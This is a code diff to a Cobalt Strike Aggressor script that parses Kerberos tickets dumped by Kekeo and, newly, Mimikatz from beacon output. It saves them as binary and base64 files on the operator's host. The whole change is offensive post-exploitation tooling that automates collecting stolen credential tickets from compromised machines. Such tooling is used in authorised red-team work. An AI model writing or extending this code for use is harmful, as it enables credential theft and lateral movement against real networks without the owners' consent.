@@ -530,9 +530,10 @@ sub parseRubeusMonitor {
     }
 }
 
-sub parseKekeo {
+sub parseKiwi {
     $bid = $1;
     $kerbTickets = $2;
+    $ticketSource = $3;
 
     $filenameStartPattern = "Base64 of file : ";
     $filenameEndPattern = "\r\n====================\r\n";
@@ -580,12 +581,12 @@ sub parseKekeo {
 
             # Save ticket locally to Cobalt Strike operator's host
             $filename = getDirectory();
-            $filename = $filename . "/KEKEO_" . $ticketFileName;
+            $filename = $filename . "/" . $ticketSource . "_" . $ticketFileName;
             saveBinaryTicket($filename, $ticketRaw);
 
             # Save backup copy in base64 format to text file
             $filename = getDirectory() . "/tickets.txt";
-            $ticketText = dstamp(ticks()) . "\nKEKEO_" . $ticketFileName . "\n" . $ticketFormatted . "\n"; 
+            $ticketText = dstamp(ticks()) . "\n" . $ticketSource . "_" . $ticketFileName . "\n" . $ticketFormatted . "\n"; 
             saveText($filename, $ticketText);
 
             $kerbTickets = substr($kerbTickets, $ticketEndIndex + strlen($ticketEndPattern)); # remove saved ticket from string of all tickets
@@ -620,6 +621,8 @@ on beacon_output {
     $checkRubeusRoastPattern2 = "\$krb5asrep\$";
     $checkKekeoPattern1 = "\r\nBase64 of file : ";
     $checkKekeoPattern2 = "\r\n====================\r\n";
+    $checkMimikatzPattern1 = "\nBase64 of file : ";
+    $checkMimikatzPattern2 = "\n====================\n";
     $beaconOutput = replace($2, "received output:\n", "");
 
     if ($s4uPattern isin $beaconOutput)
@@ -664,7 +667,12 @@ on beacon_output {
     }
     else if ($checkKekeoPattern1 isin $beaconOutput && $checkKekeoPattern2 isin $beaconOutput)
     {
-        parseKekeo($bid, $beaconOutput);
+        parseKiwi($bid, $beaconOutput, "KEKEO");
+    }
+    else if ($checkMimikatzPattern1 isin $beaconOutput && $checkMimikatzPattern2 isin $beaconOutput)
+    {
+        $modifiedBeaconOutput = replace($beaconOutput, "\n", "\r\n");
+        parseKiwi($bid, $modifiedBeaconOutput, "MIMIKATZ");
     }
 }
 
